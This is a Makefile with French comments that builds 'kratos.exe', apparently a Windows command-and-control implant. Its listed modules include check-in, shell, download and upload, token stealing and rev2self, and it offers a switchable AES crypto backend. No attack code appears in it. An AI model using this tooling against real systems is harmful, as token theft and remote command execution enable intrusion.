SRC = main.c Checkin.c utils.c crypto.c \
      command_shell.c command_run.c command_getuid.c \
      command_pwd.c command_cd.c command_ls.c \
      command_sleep.c command_exit.c \
      command_cat.c command_cp.c command_mv.c \
      command_rm.c command_mkdir.c command_ps.c \
      command_kill.c command_whoami.c command_ifconfig.c \
      command_download.c command_upload.c \
      command_steal_token.c command_rev2self.c

# Backend crypto : USE_BCRYPT (défaut) ou USE_TINY_AES
# Passé via CFLAGS=-DUSE_TINY_AES par builder.py
ifneq (,$(findstring USE_TINY_AES,$(CFLAGS)))
    SRC += aes.c sha256.c
    LIBS = -lwinhttp -ladvapi32
    # CRITIQUE : propager AES256 à TOUS les .c (aes.c se compile indépendamment)
    # Sans ça, aes.c = AES-128 et crypto.c pense AES-256 → struct AES_ctx corrompu
    AES_DEFINES = -DAES256=1 -DCBC=1 -DECB=0 -DCTR=0
else
    LIBS = -lwinhttp -lbcrypt -ladvapi32
    AES_DEFINES =
endif

kratos: $(SRC)
	$(CC) $(CFLAGS) $(AES_DEFINES) -o kratos.exe $(SRC) $(LIBS)

clean:
	rm -f kratos.exe
